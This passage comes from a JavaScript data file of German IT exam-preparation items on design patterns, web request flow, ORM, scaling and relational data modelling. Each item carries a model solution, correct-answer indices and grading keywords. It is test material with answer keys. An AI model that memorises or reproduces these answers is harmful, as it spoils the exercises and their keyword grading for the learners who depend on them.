    context: `In einer Anwendung soll es genau ein Objekt <code>Konfiguration</code> geben, das die Einstellungen aus einer Datei lädt und überall in der Anwendung abrufbar ist.`,
    question: `Implementieren Sie die Klasse <code>Konfiguration</code> nach dem Singleton-Muster (Java oder Pseudocode) und nennen Sie einen Nachteil dieses Musters.`,
    solution: `<pre><code>public final class Konfiguration {
    private static Konfiguration instanz;          // die einzige Instanz
    private final Properties werte = new Properties();

    private Konfiguration() {                      // privater Konstruktor
        // Einstellungen aus Datei laden
    }

    public static synchronized Konfiguration getInstance() {
        if (instanz == null) {                     // lazy initialization
            instanz = new Konfiguration();
        }
        return instanz;
    }

    public String getWert(String schluessel) {
        return werte.getProperty(schluessel);
    }
}

// Verwendung:
String dbUrl = Konfiguration.getInstance().getWert("db.url");</code></pre>
<b>Nachteile:</b> globaler Zustand → versteckte Abhängigkeiten, erschwerte Unit-Tests (schwer zu mocken), Synchronisationsaufwand bei Nebenläufigkeit, Verletzung des Single-Responsibility-Prinzips. Alternative: Dependency Injection mit Scope „singleton“.`,
    explanation: `Kernelemente: privater Konstruktor, private statische Instanzvariable, öffentliche statische Zugriffsmethode. Ohne <code>synchronized</code> (oder eager initialization) können in Multithreading-Umgebungen zwei Instanzen entstehen.`,
    keywords: ["private", "static", "getinstance", "konstruktor|konfiguration()", "null", "new konfiguration", "synchronized|thread", "test|global|kopplung"],
    tags: ["entwurfsmuster", "singleton"]
  },
  {
    id: "ga1-architektur-017", part: "GA1", topic: "ga1-architektur", type: "code", difficulty: 3, points: 8, lang: "java",
    context: `Ein Onlineshop berechnet Versandkosten unterschiedlich: <b>Standard</b> (4,90 €, ab 50 € Warenwert kostenlos), <b>Express</b> (9,90 € pauschal) und <b>Abholung</b> (0 €). Weitere Versandarten sollen später ohne Änderung der Klasse <code>Warenkorb</code> ergänzt werden können. Derzeit enthält <code>Warenkorb</code> eine lange <code>switch</code>-Anweisung.`,
    question: `Lösen Sie das Problem mit dem Strategy-Muster. Geben Sie das Klassendiagramm in Textnotation an und implementieren Sie die Schnittstelle, eine konkrete Strategie sowie die Verwendung im Warenkorb.`,
    solution: `<b>Klassendiagramm:</b>
<pre>interface Versandstrategie {
  + berechne(warenwert : BigDecimal) : BigDecimal
}
class StandardVersand ..|&gt; Versandstrategie
class ExpressVersand  ..|&gt; Versandstrategie
class Abholung        ..|&gt; Versandstrategie
class Warenkorb {
  - strategie : Versandstrategie
  + setVersandstrategie(s : Versandstrategie) : void
  + getVersandkosten() : BigDecimal
}
Warenkorb "*" --&gt; "1" Versandstrategie</pre>
<b>Code:</b>
<pre><code>public interface Versandstrategie {
    BigDecimal berechne(BigDecimal warenwert);
}

public class StandardVersand implements Versandstrategie {
    private static final BigDecimal GRENZE = new BigDecimal("50.00");
    public BigDecimal berechne(BigDecimal warenwert) {
        return warenwert.compareTo(GRENZE) &gt;= 0
               ? BigDecimal.ZERO : new BigDecimal("4.90");
    }
}

public class Warenkorb {
    private Versandstrategie strategie = new StandardVersand();
    private BigDecimal warenwert = BigDecimal.ZERO;

    public void setVersandstrategie(Versandstrategie s) { this.strategie = s; }

    public BigDecimal getVersandkosten() {
        return strategie.berechne(warenwert);   // Delegation statt switch
    }
}

// Verwendung
warenkorb.setVersandstrategie(new ExpressVersand());</code></pre>`,
    explanation: `Vorteil: Open-Closed-Prinzip – neue Versandarten = neue Klasse, keine Änderung am Warenkorb. Fehler: Vererbung vom Warenkorb (StandardWarenkorb, ExpressWarenkorb) – Strategy setzt auf Komposition/Delegation statt Vererbung.`,
    keywords: ["interface", "implements|..|>|..|&gt;", "versandstrategie", "berechne", "setversandstrategie|set", "strategie.berechne|delegation", "standardversand", "bigdecimal"],
    tags: ["entwurfsmuster", "strategy"]
  },
  {
    id: "ga1-architektur-018", part: "GA1", topic: "ga1-architektur", type: "order", difficulty: 2, points: 4,
    question: `Ein Benutzer gibt <code>https://www.beispiel-shop.de/produkte</code> im Browser ein (Seite ist noch nicht im Cache). Bringen Sie die Abläufe in die richtige Reihenfolge.`,
    items: [
      `DNS-Auflösung des Hostnamens in eine IP-Adresse`,
      `Aufbau der TCP-Verbindung (3-Way-Handshake) zu Port 443`,
      `TLS-Handshake inkl. Prüfung des Serverzertifikats`,
      `Browser sendet HTTP-Request GET /produkte`,
      `Webserver leitet an den Applikationsserver weiter, der Daten aus der Datenbank lädt`,
      `Server sendet HTTP-Response 200 OK mit HTML`,
      `Browser rendert die Seite und lädt eingebundene Ressourcen (CSS, JS, Bilder) nach`
    ],
    solution: `DNS → TCP-Handshake → TLS-Handshake → HTTP-Request → serverseitige Verarbeitung (App-Server/DB) → HTTP-Response → Rendern und Nachladen weiterer Ressourcen.`,
    explanation: `Bei HTTPS kommt der TLS-Handshake <b>nach</b> dem TCP-Aufbau und <b>vor</b> dem ersten HTTP-Request (bei HTTP/3 über QUIC/UDP sind TCP und TLS zusammengefasst).`,
    tags: ["http", "web"]
  },
  {
    id: "ga1-architektur-019", part: "GA1", topic: "ga1-architektur", type: "text", difficulty: 2, points: 5,
    context: `Das Team der <b>Kanzlei Weber &amp; Partner</b> diskutiert, ob für die neue Mandantenverwaltung in Java ein ORM-Framework (JPA/Hibernate) oder direkter Datenbankzugriff per JDBC verwendet werden soll.`,
    question: `Erläutern Sie, was ein ORM ist, und nennen Sie je zwei Vor- und Nachteile gegenüber direktem SQL-Zugriff.`,
    solution: `Ein <b>ORM (Object-Relational Mapping)</b> bildet Klassen und Objekte der Anwendung automatisch auf Tabellen und Datensätze einer relationalen Datenbank ab (z.&nbsp;B. per Annotation <code>@Entity</code>, <code>@OneToMany</code>) und überbrückt so den „Impedance Mismatch“ zwischen Objektorientierung und Relationenmodell.<br>
<b>Vorteile:</b> weniger Boilerplate-SQL/Code, Datenbankunabhängigkeit (Dialekt wechselbar), automatische Abbildung von Beziehungen, Schutz vor SQL-Injection durch automatische Parametrisierung, Caching, Typsicherheit.<br>
<b>Nachteile:</b> Einarbeitungsaufwand, eingeschränkte Kontrolle über erzeugtes SQL, Performanceprobleme (N+1-Problem, Lazy Loading), Overhead bei komplexen Reports/Massenoperationen.`,
    explanation: `In der Praxis kombiniert man häufig: ORM für CRUD, natives SQL für komplexe Auswertungen.`,
    keywords: ["object-relational|objektrelational|objekt-relational", "tabelle", "klasse|objekt", "unabhängig|unabhaengig|dialekt", "boilerplate|weniger code|weniger sql", "performance|n+1", "kontrolle", "einarbeitung|komplexität"],
    tags: ["orm", "persistenz"]
  },
  {
    id: "ga1-architektur-020", part: "GA1", topic: "ga1-architektur", type: "numeric", difficulty: 2, points: 3,
    context: `Ein Microservice wird horizontal skaliert. Eine Instanz kann laut Lasttest 150 Anfragen pro Sekunde verarbeiten. In der Spitzenlast werden 1.800 Anfragen pro Sekunde erwartet. Es soll eine Reserve von 25 % eingeplant werden.`,
    question: `Wie viele Instanzen müssen hinter dem Load Balancer mindestens bereitgestellt werden?`,
    answer: 15, tolerance: 0, unit: "Instanzen",
    solution: `Benötigte Kapazität: 1.800 × 1,25 = 2.250 Anfragen/s<br>Instanzen: 2.250 / 150 = <b>15</b>`,
    explanation: `Bei nicht ganzzahligem Ergebnis immer aufrunden. Ohne Reserve wären es 1.800 / 150 = 12 Instanzen. In der Praxis plant man zusätzlich mindestens eine Instanz für Ausfälle/Wartung ein (N+1-Redundanz).`,
    tags: ["skalierung"]
  },
  {
    id: "ga1-architektur-021", part: "GA1", topic: "ga1-architektur", type: "mc", difficulty: 2, points: 2,
    context: `<pre><code>public class RechnungService {
    private final RechnungRepository repo;
    private final MailService mail;
    public RechnungService(RechnungRepository repo, MailService mail) {
        this.repo = repo;
        this.mail = mail;
    }
}</code></pre>`,
    question: `Welches Prinzip wird hier umgesetzt und welcher Vorteil ergibt sich vor allem?`,
    options: [
      `Singleton – es existiert nur eine RechnungService-Instanz.`,
      `Dependency Injection (Konstruktorinjektion) – Abhängigkeiten können beim Testen durch Mocks ersetzt werden.`,
      `Factory Method – der Konstruktor entscheidet, welche Unterklasse erzeugt wird.`,
      `Decorator – der MailService erweitert den RechnungService dynamisch.`
    ],
    correct: [1],
    solution: `<b>Dependency Injection</b> per Konstruktor: <code>RechnungService</code> erzeugt seine Abhängigkeiten nicht selbst mit <code>new</code>, sondern bekommt sie von außen (z.&nbsp;B. vom Spring-Container). Dadurch lose Kopplung und gute Testbarkeit (Mock-Repository, Fake-MailService).`,
    explanation: `DI ist eine Form der Inversion of Control. Felder <code>final</code> + Konstruktorinjektion gelten als Best Practice.`,
    tags: ["dependency-injection"]
  }
);

// ===================== ga1-datenmodell =====================
AP2.questions.push(
  {
    id: "ga1-datenmodell-001", part: "GA1", topic: "ga1-datenmodell", type: "mc", difficulty: 1, points: 2,
    context: `Ein Student kann mehrere Vorlesungen besuchen, eine Vorlesung wird von vielen Studenten besucht.`,
    question: `Wie wird diese Beziehung im Relationenmodell umgesetzt?`,
    options: [
      `Fremdschlüssel VorlesungID in der Tabelle Student`,
      `Fremdschlüssel StudentID in der Tabelle Vorlesung`,
      `Zwischentabelle mit den Fremdschlüsseln StudentID und VorlesungID, die zusammen den Primärschlüssel bilden`,
      `Beide Tabellen werden zu einer Tabelle zusammengelegt`
    ],
    correct: [2],
    solution: `n:m-Beziehungen werden über eine <b>Zwischentabelle</b> aufgelöst: <code>Belegung(<u>↑StudentID, ↑VorlesungID</u>, Note)</code>. Aus einer n:m werden zwei 1:n-Beziehungen.`,
    explanation: `Ein einzelner Fremdschlüssel in Student könnte nur genau eine Vorlesung speichern; mehrere Werte in einer Zelle würden die 1. NF verletzen.`,
    tags: ["erm", "n:m"]
  },
  {
    id: "ga1-datenmodell-002", part: "GA1", topic: "ga1-datenmodell", type: "mc", difficulty: 2, points: 2,
    context: `Ausschnitt aus einem ERM in Krähenfuß-Notation:
<pre>MITARBEITER  &gt;o--------|| ABTEILUNG</pre>
(am Ende MITARBEITER: Kreis + Krähenfuß; am Ende ABTEILUNG: zwei Striche)`,
    question: `Wie ist die Beziehung zu lesen?`,
    options: [
      `Jeder Mitarbeiter gehört zu keiner oder einer Abteilung; eine Abteilung hat genau einen Mitarbeiter.`,
      `Jeder Mitarbeiter gehört zu genau einer Abteilung; eine Abteilung hat null bis viele Mitarbeiter.`,
      `Jeder Mitarbeiter gehört zu mehreren Abteilungen; eine Abteilung hat genau einen Mitarbeiter.`,
      `Jeder Mitarbeiter gehört zu genau einer Abteilung; eine Abteilung hat mindestens einen Mitarbeiter.`
    ],
    correct: [1],
    solution: `Das Symbol am Ende ABTEILUNG (<code>||</code> = min 1, max 1) gibt an, zu wie vielen Abteilungen ein Mitarbeiter gehört: <b>genau eine</b>. Das Symbol am Ende MITARBEITER (<code>o&lt;</code> = min 0, max viele) gibt an, wie viele Mitarbeiter eine Abteilung hat: <b>0..n</b>.`,
    explanation: `Wie bei UML-Multiplizitäten steht die Angabe am gegenüberliegenden Ende. Inneres Symbol = Minimum (o = 0, | = 1), äußeres Symbol = Maximum (| = 1, Krähenfuß = viele).`,
    tags: ["erm", "kraehenfuss"]
  },
  {
    id: "ga1-datenmodell-003", part: "GA1", topic: "ga1-datenmodell", type: "mc", difficulty: 2, points: 2,
    context: `<table><tr><th><u>KundenNr</u></th><th>Name</th><th>PLZ</th><th>Ort</th></tr>
<tr><td>1</td><td>Meyer</td><td>50667</td><td>Köln</td></tr>
<tr><td>2</td><td>Schulz</td><td>50667</td><td>Köln</td></tr>
<tr><td>3</td><td>Yilmaz</td><td>80331</td><td>München</td></tr></table>`,
    question: `Gegen welche Normalform verstößt die Tabelle?`,
    options: [`1. Normalform`, `2. Normalform`, `3. Normalform`, `Die Tabelle ist vollständig normalisiert.`],
    correct: [2],
    solution: `Gegen die <b>3. NF</b>: Es besteht eine transitive Abhängigkeit <code>KundenNr → PLZ → Ort</code>. Ort hängt vom Nichtschlüsselattribut PLZ ab. Lösung: Tabelle <code>Ort(<u>PLZ</u>, Ort)</code> auslagern, in Kunde bleibt PLZ als Fremdschlüssel.`,
    explanation: `Die 2. NF ist erfüllt, weil der Primärschlüssel nur aus einem Attribut besteht (partielle Abhängigkeiten sind dann unmöglich). In der Praxis wird PLZ/Ort oft bewusst nicht normalisiert, weil eine PLZ mehrere Orte haben kann – für die Prüfung gilt aber das klassische Beispiel.`,
    tags: ["normalisierung", "3nf"]
  },
  {
    id: "ga1-datenmodell-004", part: "GA1", topic: "ga1-datenmodell", type: "mc", difficulty: 1, points: 2,
    question: `Welcher Datentyp ist für eine deutsche Postleitzahl am besten geeignet?`,
    options: [`INTEGER`, `CHAR(5)`, `DECIMAL(5,0)`, `FLOAT`],
    correct: [1],
    solution: `<b>CHAR(5)</b> (bzw. VARCHAR(5)): PLZ sind Zeichenketten mit fester Länge; mit Zahlentypen geht die führende Null verloren (01067 Dresden → 1067). Mit ihnen wird außerdem nie gerechnet.`,
    explanation: `Faustregel: Nur Werte, mit denen gerechnet wird, als Zahl speichern. Telefonnummern, PLZ, IBAN, Artikelnummern mit führenden Nullen → Zeichenketten.`,
    tags: ["datentypen"]
  },
  {
    id: "ga1-datenmodell-005", part: "GA1", topic: "ga1-datenmodell", type: "multi", difficulty: 2, points: 4,
    context: `Eine Werkstatt speichert Aufträge in einer einzigen Tabelle:
<table><tr><th><u>AuftragNr</u></th><th>Datum</th><th>KundeNr</th><th>KundeName</th><th>KundeTelefon</th><th>Kennzeichen</th></tr>
<tr><td>901</td><td>2026-11-02</td><td>17</td><td>Krüger</td><td>0221 4711</td><td>K-AB 123</td></tr>
<tr><td>902</td><td>2026-11-03</td><td>17</td><td>Krüger</td><td>0221 4711</td><td>K-AB 123</td></tr>
<tr><td>903</td><td>2026-11-03</td><td>22</td><td>Öztürk</td><td>0228 3344</td><td>BN-XY 9</td></tr></table>`,
    question: `Welche Anomalien können hier auftreten? (Mehrfachauswahl)`,
    options: [
      `Ändert Herr Krüger seine Telefonnummer, muss sie in mehreren Datensätzen geändert werden (Änderungsanomalie).`,
      `Ein neuer Kunde kann erst gespeichert werden, wenn er einen Auftrag erteilt (Einfügeanomalie).`,
      `Wird Auftrag 903 gelöscht, gehen alle Daten von Frau Öztürk verloren (Löschanomalie).`,
      `Der Primärschlüssel AuftragNr kann doppelt vergeben werden (Schlüsselanomalie).`,
      `Das Datum verletzt die 1. NF, weil es aus Jahr, Monat und Tag besteht.`
    ],
    correct: [0, 1, 2],
    solution: `Es treten alle drei klassischen Anomalien auf: <b>Änderungs-</b> (redundante Telefonnummer), <b>Einfüge-</b> (Kunde ohne Auftrag nicht speicherbar, da AuftragNr der PK ist) und <b>Löschanomalie</b> (letzter Auftrag weg → Kunde weg). Ursache: transitive Abhängigkeit AuftragNr → KundeNr → KundeName, KundeTelefon (Verstoß gegen 3. NF).<br>Eine „Schlüsselanomalie“ gibt es nicht – ein PK ist per Definition eindeutig. Ein Datum ist ein atomarer Wert (Datentyp DATE).`,
    explanation: `Lösung: Kunde(<u>KundeNr</u>, Name, Telefon) und Auftrag(<u>AuftragNr</u>, Datum, ↑KundeNr, ↑Kennzeichen) und ggf. Fahrzeug(<u>Kennzeichen</u>, ↑KundeNr).`,
    tags: ["anomalien"]
  },
  {
    id: "ga1-datenmodell-006", part: "GA1", topic: "ga1-datenmodell", type: "multi", difficulty: 2, points: 4,
    question: `Welche Zuordnungen von Einsatzszenario zu NoSQL-Datenbanktyp sind sinnvoll? (Mehrfachauswahl)`,
    options: [
      `Session-Daten und Caching einer Webanwendung → Key-Value-Store (z.&nbsp;B. Redis)`,
      `Empfehlungen „Freunde von Freunden“ in einem sozialen Netzwerk → Graphdatenbank (z.&nbsp;B. Neo4j)`,
      `Produktkatalog mit stark unterschiedlichen Attributen je Produktart → Dokumentendatenbank (z.&nbsp;B. MongoDB)`,
      `Speicherung sehr großer Mengen von Sensordaten/Zeitreihen mit hoher Schreiblast → spaltenorientierte DB (z.&nbsp;B. Cassandra)`,
      `Buchhaltung mit strengen ACID-Transaktionen über mehrere Konten → Key-Value-Store ohne Transaktionen`
    ],
    correct: [0, 1, 2, 3],
    solution: `Die ersten vier Zuordnungen sind typische Einsatzfelder. Für eine Buchhaltung mit Transaktionen über mehrere Datensätze ist eine <b>relationale Datenbank</b> mit ACID-Eigenschaften die richtige Wahl.`,
    explanation: `NoSQL-Systeme verzichten häufig zugunsten von Skalierbarkeit und Verfügbarkeit auf strenge Konsistenz (BASE, eventual consistency).`,
    tags: ["nosql"]
  },
  {
    id: "ga1-datenmodell-007", part: "GA1", topic: "ga1-datenmodell", type: "multi", difficulty: 3, points: 4,
    context: `<pre>CREATE TABLE Kunde (KundeID INTEGER PRIMARY KEY, Name VARCHAR(80) NOT NULL);
CREATE TABLE Bestellung (
  BestellID INTEGER PRIMARY KEY,
  KundeID   INTEGER NOT NULL,
  FOREIGN KEY (KundeID) REFERENCES Kunde(KundeID) ON DELETE RESTRICT
);</pre>`,
    question: `Welche Aussagen zur referentiellen Integrität sind korrekt? (Mehrfachauswahl)`,
    options: [
      `Eine Bestellung mit KundeID 99 kann nur eingefügt werden, wenn ein Kunde mit KundeID 99 existiert.`,
      `Ein Kunde, zu dem noch Bestellungen existieren, kann nicht gelöscht werden.`,
      `Wird ein Kunde gelöscht, werden seine Bestellungen automatisch mitgelöscht.`,
      `Mit <code>ON DELETE SET NULL</code> würde die KundeID der Bestellungen beim Löschen auf NULL gesetzt – das ist hier wegen NOT NULL aber nicht möglich.`,
      `Referentielle Integrität stellt sicher, dass Primärschlüsselwerte eindeutig sind.`
    ],
    correct: [0, 1, 3],
    solution: `Richtig: FK-Werte müssen in der Elterntabelle existieren; RESTRICT verhindert das Löschen referenzierter Kunden; SET NULL kollidiert mit NOT NULL.<br>Falsch: Automatisches Mitlöschen wäre <code>ON DELETE CASCADE</code>. Eindeutigkeit der PK-Werte ist <b>Entitätsintegrität</b>, nicht referentielle Integrität.`,
    explanation: `In SQLite muss die FK-Prüfung per <code>PRAGMA foreign_keys = ON</code> aktiviert werden – in der Prüfung irrelevant, in der Praxis eine beliebte Falle.`,
    tags: ["referentielle-integritaet"]
  },
  {
    id: "ga1-datenmodell-008", part: "GA1", topic: "ga1-datenmodell", type: "text", difficulty: 2, points: 6,
    question: `Erläutern Sie die 1., 2. und 3. Normalform. Geben Sie jeweils ein kurzes Beispiel für einen Verstoß an.`,
    solution: `<ul>
<li><b>1. NF</b>: Alle Attributwerte sind <b>atomar</b>; keine Mehrfachwerte oder Wiederholungsgruppen.<br>Verstoß: Spalte <code>Telefon = "0221-123, 0171-456"</code> oder <code>Name = "Max Mustermann"</code>, wenn nach Nachnamen sortiert werden soll.</li>
<li><b>2. NF</b>: 1. NF und jedes Nichtschlüsselattribut ist <b>voll funktional vom gesamten Primärschlüssel</b> abhängig (keine Abhängigkeit von nur einem Teil eines zusammengesetzten Schlüssels).<br>Verstoß: <code>Bestellposition(<u>BestellNr, ArtikelNr</u>, Menge, Artikelbezeichnung)</code> – Artikelbezeichnung hängt nur von ArtikelNr ab.</li>
<li><b>3. NF</b>: 2. NF und <b>keine transitiven Abhängigkeiten</b>, d.&nbsp;h. kein Nichtschlüsselattribut hängt von einem anderen Nichtschlüsselattribut ab.<br>Verstoß: <code>Mitarbeiter(<u>PersNr</u>, Name, AbtNr, AbtName)</code> – AbtName hängt von AbtNr ab.</li>
</ul>
Ziel der Normalisierung: Redundanzen und Anomalien (Einfüge-, Änderungs-, Löschanomalie) vermeiden.`,
    explanation: `Häufiger Fehler: 2. NF und 3. NF verwechseln. Merke: 2. NF = Teil des Schlüssels, 3. NF = Nichtschlüsselattribut bestimmt Nichtschlüsselattribut.`,
    keywords: ["atomar", "wiederholungsgruppe|mehrfach", "voll funktional|vollständig|gesamten", "zusammengesetzt|teil des schlüssels|partiell", "transitiv", "nichtschlüssel|nicht-schlüssel|nichtschluessel", "redundanz|anomalie"],
    tags: ["normalisierung"]
  },
  {
    id: "ga1-datenmodell-009", part: "GA1", topic: "ga1-datenmodell", type: "text", difficulty: 2, points: 8,
    context: `Die Musikschule <b>Klangwerk</b> möchte ihre Verwaltung digitalisieren:<br>
„<i>Schüler (Name, Geburtsdatum, Telefon) belegen Kurse. Ein Schüler kann mehrere Kurse belegen, ein Kurs hat mehrere Schüler. Zu jeder Belegung wird das Anmeldedatum gespeichert. Jeder Kurs (Bezeichnung, Wochentag, Uhrzeit) wird von genau einem Lehrer geleitet, ein Lehrer (Name, Instrument) leitet mehrere Kurse. Jeder Kurs findet in genau einem Raum (Nummer, Größe) statt; ein Raum wird für mehrere Kurse genutzt.</i>“`,
    question: `Beschreiben Sie das zugehörige ER-Modell in Chen-Notation: Entitätstypen mit Attributen (Schlüssel kennzeichnen), Beziehungstypen mit Kardinalitäten und Beziehungsattributen.`,
    solution: `<b>Entitätstypen</b> (Schlüssel unterstrichen, ggf. künstlich ergänzt):
<ul><li>SCHÜLER(<u>SchuelerNr</u>, Name, Geburtsdatum, Telefon)</li>
<li>KURS(<u>KursNr</u>, Bezeichnung, Wochentag, Uhrzeit)</li>
<li>LEHRER(<u>LehrerNr</u>, Name, Instrument)</li>
<li>RAUM(<u>RaumNr</u>, Größe)</li></ul>
<b>Beziehungstypen</b>:
<pre>SCHÜLER  m ——&lt; belegt &gt;—— n  KURS     Beziehungsattribut: Anmeldedatum
LEHRER   1 ——&lt; leitet &gt;—— n  KURS
RAUM     1 ——&lt; findet statt in &gt;—— n  KURS</pre>
Lesart: Ein Lehrer leitet n Kurse, ein Kurs wird von 1 Lehrer geleitet; ein Raum wird für n Kurse genutzt, ein Kurs findet in 1 Raum statt.`,
    explanation: `Das Anmeldedatum ist ein Attribut der Beziehung „belegt“ (nicht von Schüler oder Kurs), da es von der Kombination abhängt. Fehler: Kardinalität 1:n falsch herum notieren oder Beziehungsattribute einer Entität zuordnen.`,
    keywords: ["schüler|schueler", "kurs", "lehrer", "raum", "belegt|belegung", "n:m|m:n|m — n|m und n", "1:n|1 — n", "anmeldedatum", "schlüssel|primär|unterstrichen|nr"],
    tags: ["erm", "chen"]
  },
  {
    id: "ga1-datenmodell-010", part: "GA1", topic: "ga1-datenmodell", type: "text", difficulty: 2, points: 4,
    context: `Für das Management-Dashboard eines Onlinehändlers dauert eine Umsatzauswertung über 6 Tabellen mit Millionen Datensätzen mehrere Minuten. Ein Kollege schlägt Denormalisierung vor.`,
    question: `Erläutern Sie den Begriff Denormalisierung und nennen Sie je einen Vor- und Nachteil sowie eine Maßnahme, um den Nachteil zu begrenzen.`,
    solution: `<b>Denormalisierung</b> ist das bewusste Rückgängigmachen der Normalisierung, d.&nbsp;h. das gezielte Einführen kontrollierter <b>Redundanz</b> (z.&nbsp;B. Zusammenfassen von Tabellen, Speichern berechneter Werte wie Monatsumsatz je Kunde), um Lesezugriffe zu beschleunigen.<br>
<b>Vorteil:</b> weniger Joins → deutlich schnellere Abfragen/Reports.<br>
<b>Nachteil:</b> Redundanz → Gefahr von Inkonsistenzen und Änderungsanomalien, höherer Speicherbedarf, aufwendigere Schreibvorgänge.<br>
<b>Maßnahme:</b> redundante Daten automatisiert pflegen (Trigger, Materialized Views, nächtlicher ETL-Job in ein separates Data Warehouse/Reporting-Schema) und das operative System normalisiert lassen.`,
    explanation: `Denormalisierung ist kein Entwurfsfehler, sondern eine bewusste, dokumentierte Performance-Entscheidung.`,
    keywords: ["redundanz|redundant", "performance|schneller|beschleunig", "join", "inkonsisten", "anomalie|änderung", "materialized|view|trigger|data warehouse|etl", "bewusst|gezielt"],
    tags: ["denormalisierung"]
  },
  {
    id: "ga1-datenmodell-011", part: "GA1", topic: "ga1-datenmodell", type: "text", difficulty: 3, points: 6,
    context: `Ein Start-up entwickelt eine Plattform für Gebrauchtwaren-Kleinanzeigen. Anzeigen haben je nach Kategorie völlig unterschiedliche Attribute (Auto: Kilometerstand, Erstzulassung; Wohnung: Zimmer, Fläche; Kleidung: Größe, Marke). Es werden schnell wachsende Zugriffszahlen erwartet. Zahlungen werden über einen externen Dienstleister abgewickelt.`,
    question: `Beurteilen Sie, ob für die Speicherung der Anzeigen eine relationale Datenbank oder eine Dokumentendatenbank besser geeignet ist. Nennen Sie drei Argumente und geben Sie eine Empfehlung.`,
    solution: `<b>Argumente für eine Dokumentendatenbank (z.&nbsp;B. MongoDB):</b>
<ul><li><b>Flexibles Schema</b>: Jede Anzeige wird als JSON-Dokument mit kategoriespezifischen Feldern gespeichert, ohne viele NULL-Spalten oder EAV-Konstrukte (Entity-Attribute-Value).</li>
<li><b>Horizontale Skalierung</b> (Sharding) bei stark wachsenden Zugriffen.</li>
<li>Eine Anzeige wird meist als Ganzes gelesen → passt zum Dokumentmodell (keine Joins).</li>
<li>Schnelle Weiterentwicklung: neue Kategorien ohne Schemamigration.</li></ul>
<b>Argumente für relational:</b> starke Konsistenz/ACID, ausgereifte Abfragesprache SQL, referentielle Integrität (z.&nbsp;B. Benutzer ↔ Anzeigen), Know-how meist vorhanden.<br>
<b>Empfehlung:</b> Dokumentendatenbank für die Anzeigen, da die heterogenen Attribute und Skalierbarkeit im Vordergrund stehen und keine komplexen Transaktionen nötig sind (Zahlungen extern). Alternativ möglich: relationale DB mit JSON-Spalten (z.&nbsp;B. PostgreSQL JSONB) als Kompromiss.`,
    explanation: `Bewertet wird die nachvollziehbare Begründung mit Bezug zum Szenario. Eine Empfehlung „relational mit JSONB“ ist mit guter Begründung ebenfalls vollwertig.`,
    keywords: ["dokument|mongodb", "schema|schemafrei|flexibel", "skalier|sharding", "json", "acid|konsistenz|transaktion", "relational", "join", "empfehl"],
    tags: ["nosql", "datenbankauswahl"]
  },
  {
    id: "ga1-datenmodell-012", part: "GA1", topic: "ga1-datenmodell", type: "text", difficulty: 2, points: 5,
    question: `Bestimmen Sie für die folgenden Beziehungen die Kardinalität (1:1, 1:n, n:m) und begründen Sie kurz:
<ol><li>Person – Personalausweis (aktuell gültig)</li>
<li>Mannschaft – Spieler (zu einem Zeitpunkt, ein Spieler spielt nur in einer Mannschaft)</li>
<li>Autor – Buch</li>
<li>Rechnung – Rechnungsposition</li>
<li>Arzt – Patient (Praxis mit mehreren Ärzten, freie Arztwahl)</li></ol>`,
    solution: `<ol><li><b>1:1</b> – eine Person besitzt höchstens einen gültigen Personalausweis, ein Ausweis gehört genau einer Person (genauer 1:c, da nicht jede Person einen hat).</li>
<li><b>1:n</b> – eine Mannschaft hat viele Spieler, ein Spieler gehört zu genau einer Mannschaft.</li>
<li><b>n:m</b> – ein Autor schreibt mehrere Bücher, ein Buch kann mehrere Autoren haben.</li>
<li><b>1:n</b> – eine Rechnung hat mehrere Positionen, jede Position gehört zu genau einer Rechnung (existenzabhängig).</li>
<li><b>n:m</b> – ein Arzt behandelt viele Patienten, ein Patient kann von mehreren Ärzten behandelt werden.</li></ol>`,
    explanation: `Immer beide Richtungen prüfen („Ein A hat wie viele B? Ein B hat wie viele A?“). Zeitliche Aspekte (Historie) können aus 1:n eine n:m machen – z.&nbsp;B. wenn Vereinswechsel gespeichert werden sollen.`,
    keywords: ["1:1", "1:n", "n:m|m:n", "personalausweis|ausweis", "mannschaft", "autor", "rechnung", "arzt"],
    tags: ["kardinalitaet"]
  },
  {
    id: "ga1-datenmodell-013", part: "GA1", topic: "ga1-datenmodell", type: "code", difficulty: 3, points: 10, lang: "pseudocode",
    context: `Für ein Hotel liegt folgendes ER-Modell vor (Kardinalitäten in Chen-Notation):
<pre>GAST(GastNr, Vorname, Nachname, Email)
ZIMMER(ZimmerNr, Kategorie, Preis_pro_Nacht)
BUCHUNG(BuchungsNr, Anreise, Abreise)
LEISTUNG(LeistungNr, Bezeichnung, Preis)      z. B. Frühstück, Parkplatz

GAST    1 —— tätigt ——  n BUCHUNG
BUCHUNG m —— umfasst —— n ZIMMER
BUCHUNG m —— enthält —— n LEISTUNG      Beziehungsattribute: Anzahl, Datum
ZIMMER  n —— gehört zu —— 1 KATEGORIE(KategorieID, Name, Beschreibung)</pre>`,
    question: `Überführen Sie das ER-Modell in ein Relationenmodell. Kennzeichnen Sie Primärschlüssel (unterstrichen oder PK) und Fremdschlüssel (↑ oder FK).`,
    solution: `<pre>Gast       (<u>GastNr</u>, Vorname, Nachname, Email)
Kategorie  (<u>KategorieID</u>, Name, Beschreibung)
Zimmer     (<u>ZimmerNr</u>, Preis_pro_Nacht, ↑KategorieID)
Buchung    (<u>BuchungsNr</u>, Anreise, Abreise, ↑GastNr)
Leistung   (<u>LeistungNr</u>, Bezeichnung, Preis)

Buchung_Zimmer   (<u>↑BuchungsNr, ↑ZimmerNr</u>)
Buchung_Leistung (<u>↑BuchungsNr, ↑LeistungNr, Datum</u>, Anzahl)</pre>
Erläuterung:
<ul><li>1:n Gast–Buchung → GastNr als FK in Buchung.</li>
<li>n:1 Zimmer–Kategorie → KategorieID als FK in Zimmer (das Attribut „Kategorie“ entfällt in Zimmer).</li>
<li>Beide n:m-Beziehungen → Zwischentabellen mit zusammengesetztem PK.</li>
<li>Bei Buchung_Leistung gehört Datum zum Schlüssel, falls dieselbe Leistung an mehreren Tagen gebucht werden kann (alternativ eigener Surrogatschlüssel PositionID).</li></ul>`,
    explanation: `Häufige Fehler: Beziehungsattribute (Anzahl, Datum) in Buchung oder Leistung ablegen; FK auf der falschen Seite der 1:n-Beziehung (GastNr gehört zu Buchung, nicht BuchungsNr zu Gast); Zwischentabelle ohne zusammengesetzten PK.`,
    keywords: ["gast", "buchung", "zimmer", "kategorie", "leistung", "buchung_zimmer|buchungzimmer|zwischentabelle", "buchung_leistung|buchungleistung", "fk|↑|fremdschlüssel", "anzahl", "pk|primärschlüssel|unterstrichen"],
    tags: ["relationenmodell", "erm"]
  },
  {
    id: "ga1-datenmodell-014", part: "GA1", topic: "ga1-datenmodell", type: "code", difficulty: 3, points: 12, lang: "pseudocode",
